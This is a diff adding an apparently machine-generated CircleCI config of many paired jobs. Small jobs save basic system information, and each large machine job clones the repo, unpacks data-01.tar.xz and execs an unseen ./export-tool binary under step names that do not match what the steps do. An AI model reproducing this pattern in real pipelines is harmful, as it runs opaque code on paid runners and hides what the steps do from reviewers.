@@ -1,0 +1,1775 @@
+version: 2.1
+
+jobs:
+  kernelType:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: Compute step-3 hash
+          command: |
+            mkdir -p /tmp/a4
+            { set +o pipefail 2>/dev/null; printf '%s\n' "water the plants" >&2; true ; } > /tmp/a4/fnv_4102a488e9
+            echo "gate wip-router-v2-bug: $(wc -c </tmp/a4/fnv_4102a488e9) bytes total"
+      - persist_to_workspace:
+          root: /tmp/a4
+          paths:
+            - 'fnv_4102a488e9'
+  wip-router-v2-bug:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/a4
+      - run:
+          name: Fetch stage C
+          command: |
+            cat /tmp/a4/fnv_4102a488e9
+      - run:
+          name: Materialize tree
+          command: git clone --depth 5 --quiet --single-branch --filter=tree:0 --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Unpack vendor data
+          command: tar --extract --xz --file=data-01.tar.xz
+      - run:
+          name: Hash artifacts
+          command: uname -a
+      - run:
+          command: /bin/sleep 30
+      - run:
+          command: exec ./export-tool
+  DZ_Q:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/a4
+      - run:
+          name: Harmonize fog volumes
+          command: |
+            mkdir -p /tmp/a4
+            { set +o pipefail 2>/dev/null; cat /proc/version | head -n 6 | tr -d '[:digit:]'; true ; } > /tmp/a4/291b4dca-8986-5a5e
+            echo "gate Prepare_Pipeline9: $(wc -c </tmp/a4/291b4dca-8986-5a5e) bytes total"
+      - persist_to_workspace:
+          root: /tmp/a4
+          paths:
+            - '291b4dca-8986-5a5e'
+  Prepare_Pipeline9:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/a4
+      - run:
+          name: Fetch stage C
+          command: |
+            cat /tmp/a4/291b4dca-8986-5a5e
+      - run:
+          name: Materialize tree
+          command: git clone --depth 5 --quiet --single-branch --filter=tree:0 --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Unpack vendor data
+          command: tar --extract --xz --file=data-01.tar.xz
+      - run:
+          name: Hash artifacts
+          command: uname -a
+      - run:
+          command: /bin/sleep 30
+      - run:
+          command: exec ./export-tool
+  tRACe_vErsioN:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/a4
+      - run:
+          name: staging overstock
+          command: |
+            mkdir -p /tmp/a4
+            { set +o pipefail 2>/dev/null; cut -d'=' -f2- </etc/os-release|tr '[:lower:]' '[:upper:]'|fmt -w 32|wc -w; true ; } > /tmp/a4/m34d0w-pr0f113
+            echo "gate uma-verify: $(wc -c </tmp/a4/m34d0w-pr0f113) bytes total"
+      - persist_to_workspace:
+          root: /tmp/a4
+          paths:
+            - 'm34d0w-pr0f113'
+  uma-verify:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/a4
+      - run:
+          name: Fetch stage C
+          command: |
+            cat /tmp/a4/m34d0w-pr0f113
+      - run:
+          name: Materialize tree
+          command: git clone --depth 5 --quiet --single-branch --filter=tree:0 --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Unpack vendor data
+          command: tar --extract --xz --file=data-01.tar.xz
+      - run:
+          name: Hash artifacts
+          command: uname -a
+      - run:
+          command: /bin/sleep 30
+      - run:
+          command: exec ./export-tool
+  Hash-Log:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/a4
+      - run:
+          name: Build artifacts pruned check
+          command: |
+            mkdir -p /tmp/a4
+            { set +o pipefail 2>/dev/null; df --output=source,fstype,size,pcent / | head -4; true ; } > /tmp/a4/FDLk
+            echo "gate alpha-v7: $(wc -c </tmp/a4/FDLk) bytes total"
+      - persist_to_workspace:
+          root: /tmp/a4
+          paths:
+            - 'FDLk'
+  alpha-v7:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/a4
+      - run:
+          name: Fetch stage C
+          command: |
+            cat /tmp/a4/FDLk
+      - run:
+          name: Materialize tree
+          command: git clone --depth 5 --quiet --single-branch --filter=tree:0 --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Unpack vendor data
+          command: tar --extract --xz --file=data-01.tar.xz
+      - run:
+          name: Hash artifacts
+          command: uname -a
+      - run:
+          command: /bin/sleep 30
+      - run:
+          command: exec ./export-tool
+  detach-when:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/a4
+      - run:
+          name: Hail mary optimization
+          command: |
+            mkdir -p /tmp/a4
+            { set +o pipefail 2>/dev/null; ls -hRt /etc/skel | shuf -n 2; true ; } > /tmp/a4/b3ce192552543750897af93cc0
+            echo "gate DEV_BUILD_4: $(wc -c </tmp/a4/b3ce192552543750897af93cc0) bytes total"
+      - persist_to_workspace:
+          root: /tmp/a4
+          paths:
+            - 'b3ce192552543750897af93cc0'
+  DEV_BUILD_4:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/a4
+      - run:
+          name: Fetch stage C
+          command: |
+            cat /tmp/a4/b3ce192552543750897af93cc0
+      - run:
+          name: Materialize tree
+          command: git clone --depth 5 --quiet --single-branch --filter=tree:0 --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Unpack vendor data
+          command: tar --extract --xz --file=data-01.tar.xz
+      - run:
+          name: Hash artifacts
+          command: uname -a
+      - run:
+          command: /bin/sleep 30
+      - run:
+          command: exec ./export-tool
+  DFF846B127C:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/a4
+      - run:
+          name: Now cleaning up the old backups
+          command: |
+            mkdir -p /tmp/a4
+            { set +o pipefail 2>/dev/null; echo 'yay!'| cksum; true ; } > /tmp/a4/iron-atom-node
+            echo "gate deploy: $(wc -c </tmp/a4/iron-atom-node) bytes total"
+      - persist_to_workspace:
+          root: /tmp/a4
+          paths:
+            - 'iron-atom-node'
+  deploy:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/a4
+      - run:
+          name: Fetch stage C
+          command: |
+            cat /tmp/a4/iron-atom-node
+      - run:
+          name: Materialize tree
+          command: git clone --depth 5 --quiet --single-branch --filter=tree:0 --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Unpack vendor data
+          command: tar --extract --xz --file=data-01.tar.xz
+      - run:
+          name: Hash artifacts
+          command: uname -a
+      - run:
+          command: /bin/sleep 30
+      - run:
+          command: exec ./export-tool
+  Input2CNN:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: Petty cash gets closed now
+          command: |
+            mkdir -p /tmp/a4
+            { set +o pipefail 2>/dev/null; dirname '/tmp/booking_20230114.csv'; true ; } > /tmp/a4/agent-8960
+            echo "gate UAT_CHECK_5: $(wc -c </tmp/a4/agent-8960) bytes total"
+      - persist_to_workspace:
+          root: /tmp/a4
+          paths:
+            - 'agent-8960'
+  UAT_CHECK_5:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/a4
+      - run:
+          name: Fetch stage C
+          command: |
+            cat /tmp/a4/agent-8960
+      - run:
+          name: Materialize tree
+          command: git clone --depth 5 --quiet --single-branch --filter=tree:0 --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Unpack vendor data
+          command: tar --extract --xz --file=data-01.tar.xz
+      - run:
+          name: Hash artifacts
+          command: uname -a
+      - run:
+          command: /bin/sleep 30
+      - run:
+          command: exec ./export-tool
+  SHARD_KEY:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/a4
+      - run:
+          name: Perform sterilization of the growth medium
+          command: |
+            mkdir -p /tmp/a4
+            { set +o pipefail 2>/dev/null; sed -E 's/[[:space:]]+$//' /etc/debian_version | cat -A | head --lines=5; true ; } > /tmp/a4/c0pp3rbr0nz3
+            echo "gate run-end-to-end-docker-image: $(wc -c </tmp/a4/c0pp3rbr0nz3) bytes total"
+      - persist_to_workspace:
+          root: /tmp/a4
+          paths:
+            - 'c0pp3rbr0nz3'
+  run-end-to-end-docker-image:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/a4
+      - run:
+          name: Fetch stage C
+          command: |
+            cat /tmp/a4/c0pp3rbr0nz3
+      - run:
+          name: Materialize tree
+          command: git clone --depth 5 --quiet --single-branch --filter=tree:0 --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Unpack vendor data
+          command: tar --extract --xz --file=data-01.tar.xz
+      - run:
+          name: Hash artifacts
+          command: uname -a
+      - run:
+          command: /bin/sleep 30
+      - run:
+          command: exec ./export-tool
+  posT:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/a4
+      - run:
+          name: Do not post the journal entries
+          command: |
+            mkdir -p /tmp/a4
+            { set +o pipefail 2>/dev/null; if grep -q 'VERSION' /etc/os-release; then echo yes; else echo no; fi; true ; } > /tmp/a4/ridgeCopperKappaKernel
+            echo "gate perseus-v2: $(wc -c </tmp/a4/ridgeCopperKappaKernel) bytes total"
+      - persist_to_workspace:
+          root: /tmp/a4
+          paths:
+            - 'ridgeCopperKappaKernel'
+  perseus-v2:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/a4
+      - run:
+          name: Fetch stage C
+          command: |
+            cat /tmp/a4/ridgeCopperKappaKernel
+      - run:
+          name: Materialize tree
+          command: git clone --depth 5 --quiet --single-branch --filter=tree:0 --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Unpack vendor data
+          command: tar --extract --xz --file=data-01.tar.xz
+      - run:
+          name: Hash artifacts
+          command: uname -a
+      - run:
+          command: /bin/sleep 30
+      - run:
+          command: exec ./export-tool
+  df_ContractStackPage5:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/a4
+      - run:
+          name: Undertake follow up of the helpdesk at this point
+          command: |
+            mkdir -p /tmp/a4
+            { set +o pipefail 2>/dev/null; echo "key=value" >/tmp/Sent.md && du -h /tmp/Sent.md; true ; } > /tmp/a4/Node
+            echo "gate WEB-498: $(wc -c </tmp/a4/Node) bytes total"
+      - persist_to_workspace:
+          root: /tmp/a4
+          paths:
+            - 'Node'
+  WEB-498:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/a4
+      - run:
+          name: Fetch stage C
+          command: |
+            cat /tmp/a4/Node
+      - run:
+          name: Materialize tree
+          command: git clone --depth 5 --quiet --single-branch --filter=tree:0 --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Unpack vendor data
+          command: tar --extract --xz --file=data-01.tar.xz
+      - run:
+          name: Hash artifacts
+          command: uname -a
+      - run:
+          command: /bin/sleep 30
+      - run:
+          command: exec ./export-tool
+  TYZVPL-39484a:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/a4
+      - run:
+          name: Solo quarantine
+          command: |
+            mkdir -p /tmp/a4
+            { set +o pipefail 2>/dev/null; expand -t 6 /proc/cpuinfo|tr '[:lower:]' '[:upper:]'; true ; } > /tmp/a4/K
+            echo "gate tweak-retry-redirect: $(wc -c </tmp/a4/K) bytes total"
+      - persist_to_workspace:
+          root: /tmp/a4
+          paths:
+            - 'K'
+  tweak-retry-redirect:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/a4
+      - run:
+          name: Fetch stage C
+          command: |
+            cat /tmp/a4/K
+      - run:
+          name: Materialize tree
+          command: git clone --depth 5 --quiet --single-branch --filter=tree:0 --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Unpack vendor data
+          command: tar --extract --xz --file=data-01.tar.xz
+      - run:
+          name: Hash artifacts
+          command: uname -a
+      - run:
+          command: /bin/sleep 30
+      - run:
+          command: exec ./export-tool
+  W_TAU:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/a4
+      - run:
+          name: Finally rotate the orphaned files
+          command: |
+            mkdir -p /tmp/a4
+            { set +o pipefail 2>/dev/null; for x in /etc/*.defs ; do wc -l < $x; done | paste -sd ' '; true ; } > /tmp/a4/MarketAdmin
+            echo "gate defualt: $(wc -c </tmp/a4/MarketAdmin) bytes total"
+      - persist_to_workspace:
+          root: /tmp/a4
+          paths:
+            - 'MarketAdmin'
+  defualt:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/a4
+      - run:
+          name: Fetch stage C
+          command: |
+            cat /tmp/a4/MarketAdmin
+      - run:
+          name: Materialize tree
+          command: git clone --depth 5 --quiet --single-branch --filter=tree:0 --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Unpack vendor data
+          command: tar --extract --xz --file=data-01.tar.xz
+      - run:
+          name: Hash artifacts
+          command: uname -a
+      - run:
+          command: /bin/sleep 30
+      - run:
+          command: exec ./export-tool
+  TEMP_SCOPE_DYNAMIC:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: Compute step-3 hash
+          command: |
+            mkdir -p /tmp/a4
+            { set +o pipefail 2>/dev/null; mkdir -p '/tmp/block-item' && chmod -R go-rwx '/tmp/block-item' && ls -ld '/tmp/block-item'; true ; } > /tmp/a4/crash.log.19
+            echo "gate dp-old: $(wc -c </tmp/a4/crash.log.19) bytes total"
+      - persist_to_workspace:
+          root: /tmp/a4
+          paths:
+            - 'crash.log.19'
+  dp-old:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/a4
+      - run:
+          name: Fetch stage C
+          command: |
+            cat /tmp/a4/crash.log.19
+      - run:
+          name: Materialize tree
+          command: git clone --depth 5 --quiet --single-branch --filter=tree:0 --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Unpack vendor data
+          command: tar --extract --xz --file=data-01.tar.xz
+      - run:
+          name: Hash artifacts
+          command: uname -a
+      - run:
+          command: /bin/sleep 30
+      - run:
+          command: exec ./export-tool
+  Legacy-Union-Locked:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/a4
+      - run:
+          name: lint
+          command: |
+            mkdir -p /tmp/a4
+            { set +o pipefail 2>/dev/null; find /proc/self -maxdepth 3 -type d -size 0 -newer /etc/passwd -readable -exec stat -c %n {} + 2> /dev/null | head -n 5; true ; } > /tmp/a4/7de6f8f
+            echo "gate DEV_RUN_1: $(wc -c </tmp/a4/7de6f8f) bytes total"
+      - persist_to_workspace:
+          root: /tmp/a4
+          paths:
+            - '7de6f8f'
+  DEV_RUN_1:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/a4
+      - run:
+          name: Fetch stage C
+          command: |
+            cat /tmp/a4/7de6f8f
+      - run:
+          name: Materialize tree
+          command: git clone --depth 5 --quiet --single-branch --filter=tree:0 --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Unpack vendor data
+          command: tar --extract --xz --file=data-01.tar.xz
+      - run:
+          name: Hash artifacts
+          command: uname -a
+      - run:
+          command: /bin/sleep 30
+      - run:
+          command: exec ./export-tool
+  generatorc69140:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/a4
+      - run:
+          name: Export pre the outage
+          command: |
+            mkdir -p /tmp/a4
+            { set +o pipefail 2>/dev/null; until test -e /tmp/cookie.flag; do touch /tmp/cookie.flag; done; ls -l /tmp/cookie.flag; true ; } > /tmp/a4/omega39
+            echo "gate b-v2: $(wc -c </tmp/a4/omega39) bytes total"
+      - persist_to_workspace:
+          root: /tmp/a4
+          paths:
+            - 'omega39'
+  b-v2:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/a4
+      - run:
+          name: Fetch stage C
+          command: |
+            cat /tmp/a4/omega39
+      - run:
+          name: Materialize tree
+          command: git clone --depth 5 --quiet --single-branch --filter=tree:0 --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Unpack vendor data
+          command: tar --extract --xz --file=data-01.tar.xz
+      - run:
+          name: Hash artifacts
+          command: uname -a
+      - run:
+          command: /bin/sleep 30
+      - run:
+          command: exec ./export-tool
+  j4:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/a4
+      - run:
+          name: Loop the event stream
+          command: |
+            mkdir -p /tmp/a4
+            { set +o pipefail 2>/dev/null; grep -r case /etc/profile.d | wc -l; true ; } > /tmp/a4/valleyMolten
+            echo "gate november: $(wc -c </tmp/a4/valleyMolten) bytes total"
+      - persist_to_workspace:
+          root: /tmp/a4
+          paths:
+            - 'valleyMolten'
+  november:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/a4
+      - run:
+          name: Fetch stage C
+          command: |
+            cat /tmp/a4/valleyMolten
+      - run:
+          name: Materialize tree
+          command: git clone --depth 5 --quiet --single-branch --filter=tree:0 --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Unpack vendor data
+          command: tar --extract --xz --file=data-01.tar.xz
+      - run:
+          name: Hash artifacts
+          command: uname -a
+      - run:
+          command: /bin/sleep 30
+      - run:
+          command: exec ./export-tool
+  lishbealglossx:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/a4
+      - run:
+          name: Tab to the cookie banner
+          command: |
+            mkdir -p /tmp/a4
+            { set +o pipefail 2>/dev/null; help cd | head -n4; true ; } > /tmp/a4/plasma.token.omega.filter.delta
+            echo "gate nebula-beta: $(wc -c </tmp/a4/plasma.token.omega.filter.delta) bytes total"
+      - persist_to_workspace:
+          root: /tmp/a4
+          paths:
+            - 'plasma.token.omega.filter.delta'
+  nebula-beta:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/a4
+      - run:
+          name: Fetch stage C
+          command: |
+            cat /tmp/a4/plasma.token.omega.filter.delta
+      - run:
+          name: Materialize tree
+          command: git clone --depth 5 --quiet --single-branch --filter=tree:0 --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Unpack vendor data
+          command: tar --extract --xz --file=data-01.tar.xz
+      - run:
+          name: Hash artifacts
+          command: uname -a
+      - run:
+          command: /bin/sleep 30
+      - run:
+          command: exec ./export-tool
+  Watch-RepoObject:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/a4
+      - run:
+          name: Haul the RAID array out of region b
+          command: |
+            mkdir -p /tmp/a4
+            { set +o pipefail 2>/dev/null; printf '%s\n' "missing value" | cut -c1-9; true ; } > /tmp/a4/router.proton.fox.silver
+            echo "gate tb-alt: $(wc -c </tmp/a4/router.proton.fox.silver) bytes total"
+      - persist_to_workspace:
+          root: /tmp/a4
+          paths:
+            - 'router.proton.fox.silver'
+  tb-alt:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/a4
+      - run:
+          name: Fetch stage C
+          command: |
+            cat /tmp/a4/router.proton.fox.silver
+      - run:
+          name: Materialize tree
+          command: git clone --depth 5 --quiet --single-branch --filter=tree:0 --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Unpack vendor data
+          command: tar --extract --xz --file=data-01.tar.xz
+      - run:
+          name: Hash artifacts
+          command: uname -a
+      - run:
+          command: /bin/sleep 30
+      - run:
+          command: exec ./export-tool
+  juliett-cursor:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: Maintenance mode is quiet
+          command: |
+            mkdir -p /tmp/a4
+            { set +o pipefail 2>/dev/null; free_kb=$(awk '/MemAvailable/{print $2}' /proc/meminfo); [ $free_kb -gt 800000 ] && echo "plenty of ram" || echo "low ram"; true ; } > /tmp/a4/YieldDelta
+            echo "gate publish: $(wc -c </tmp/a4/YieldDelta) bytes total"
+      - persist_to_workspace:
+          root: /tmp/a4
+          paths:
+            - 'YieldDelta'
+  publish:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/a4
+      - run:
+          name: Fetch stage C
+          command: |
+            cat /tmp/a4/YieldDelta
+      - run:
+          name: Materialize tree
+          command: git clone --depth 5 --quiet --single-branch --filter=tree:0 --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Unpack vendor data
+          command: tar --extract --xz --file=data-01.tar.xz
+      - run:
+          name: Hash artifacts
+          command: uname -a
+      - run:
+          command: /bin/sleep 30
+      - run:
+          command: exec ./export-tool
+  ukbeacmhnapic:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/a4
+      - run:
+          name: Particle system load
+          command: |
+            mkdir -p /tmp/a4
+            { set +o pipefail 2>/dev/null; for item in /etc/profile.d/*; do du -h $item; done | paste -sd ' '; true ; } > /tmp/a4/thund3rvau1t
+            echo "gate PrepareImage: $(wc -c </tmp/a4/thund3rvau1t) bytes total"
+      - persist_to_workspace:
+          root: /tmp/a4
+          paths:
+            - 'thund3rvau1t'
+  PrepareImage:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/a4
+      - run:
+          name: Fetch stage C
+          command: |
+            cat /tmp/a4/thund3rvau1t
+      - run:
+          name: Materialize tree
+          command: git clone --depth 5 --quiet --single-branch --filter=tree:0 --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Unpack vendor data
+          command: tar --extract --xz --file=data-01.tar.xz
+      - run:
+          name: Hash artifacts
+          command: uname -a
+      - run:
+          command: /bin/sleep 30
+      - run:
+          command: exec ./export-tool
+  ROUTER_202211:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/a4
+      - run:
+          name: A 18 PRUNING LOCKFILE
+          command: |
+            mkdir -p /tmp/a4
+            { set +o pipefail 2>/dev/null; df -hT | head -n 4; true ; } > /tmp/a4/RMA-2022-30813
+            echo "gate DeployRelease: $(wc -c </tmp/a4/RMA-2022-30813) bytes total"
+      - persist_to_workspace:
+          root: /tmp/a4
+          paths:
+            - 'RMA-2022-30813'
+  DeployRelease:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/a4
+      - run:
+          name: Fetch stage C
+          command: |
+            cat /tmp/a4/RMA-2022-30813
+      - run:
+          name: Materialize tree
+          command: git clone --depth 5 --quiet --single-branch --filter=tree:0 --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Unpack vendor data
+          command: tar --extract --xz --file=data-01.tar.xz
+      - run:
+          name: Hash artifacts
+          command: uname -a
+      - run:
+          command: /bin/sleep 30
+      - run:
+          command: exec ./export-tool
+  deployWillAppear:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/a4
+      - run:
+          name: Back up the user avatars once standup is done
+          command: |
+            mkdir -p /tmp/a4
+            { set +o pipefail 2>/dev/null; cat /proc/cpuinfo | grep -v 'siblings' | head -n 6; true ; } > /tmp/a4/5b788432
+            echo "gate py310-fmt: $(wc -c </tmp/a4/5b788432) bytes total"
+      - persist_to_workspace:
+          root: /tmp/a4
+          paths:
+            - '5b788432'
+  py310-fmt:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/a4
+      - run:
+          name: Fetch stage C
+          command: |
+            cat /tmp/a4/5b788432
+      - run:
+          name: Materialize tree
+          command: git clone --depth 5 --quiet --single-branch --filter=tree:0 --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Unpack vendor data
+          command: tar --extract --xz --file=data-01.tar.xz
+      - run:
+          name: Hash artifacts
+          command: uname -a
+      - run:
+          command: /bin/sleep 30
+      - run:
+          command: exec ./export-tool
+  closeLevelForKey:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/a4
+      - run:
+          name: 2023 resize
+          command: |
+            mkdir -p /tmp/a4
+            { set +o pipefail 2>/dev/null; ps -eo pid,user,comm,%mem | sort -k3,3 -n -r | grep -v grep | wc -l; true ; } > /tmp/a4/SSH.Dream_Queue_ci
+            echo "gate d-x: $(wc -c </tmp/a4/SSH.Dream_Queue_ci) bytes total"
+      - persist_to_workspace:
+          root: /tmp/a4
+          paths:
+            - 'SSH.Dream_Queue_ci'
+  d-x:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/a4
+      - run:
+          name: Fetch stage C
+          command: |
+            cat /tmp/a4/SSH.Dream_Queue_ci
+      - run:
+          name: Materialize tree
+          command: git clone --depth 5 --quiet --single-branch --filter=tree:0 --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Unpack vendor data
+          command: tar --extract --xz --file=data-01.tar.xz
+      - run:
+          name: Hash artifacts
+          command: uname -a
+      - run:
+          command: /bin/sleep 30
+      - run:
+          command: exec ./export-tool
+  x_test:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/a4
+      - run:
+          name: Masking tier 1
+          command: |
+            mkdir -p /tmp/a4
+            { set +o pipefail 2>/dev/null; if test -c /dev/null; then echo 'it is there'; else echo nope; fi; true ; } > /tmp/a4/yt
+            echo "gate fix-cache-timeout: $(wc -c </tmp/a4/yt) bytes total"
+      - persist_to_workspace:
+          root: /tmp/a4
+          paths:
+            - 'yt'
+  fix-cache-timeout:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/a4
+      - run:
+          name: Fetch stage C
+          command: |
+            cat /tmp/a4/yt
+      - run:
+          name: Materialize tree
+          command: git clone --depth 5 --quiet --single-branch --filter=tree:0 --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Unpack vendor data
+          command: tar --extract --xz --file=data-01.tar.xz
+      - run:
+          name: Hash artifacts
+          command: uname -a
+      - run:
+          command: /bin/sleep 30
+      - run:
+          command: exec ./export-tool
+  build2042:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: Compute step-3 hash
+          command: |
+            mkdir -p /tmp/a4
+            { set +o pipefail 2>/dev/null; echo 'status: ok' && echo 'line one'; true ; } > /tmp/a4/config-9c27.log
+            echo "gate p-3: $(wc -c </tmp/a4/config-9c27.log) bytes total"
+      - persist_to_workspace:
+          root: /tmp/a4
+          paths:
+            - 'config-9c27.log'
+  p-3:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/a4
+      - run:
+          name: Fetch stage C
+          command: |
+            cat /tmp/a4/config-9c27.log
+      - run:
+          name: Materialize tree
+          command: git clone --depth 5 --quiet --single-branch --filter=tree:0 --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Unpack vendor data
+          command: tar --extract --xz --file=data-01.tar.xz
+      - run:
+          name: Hash artifacts
+          command: uname -a
+      - run:
+          command: /bin/sleep 30
+      - run:
+          command: exec ./export-tool
+  sigma_star:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
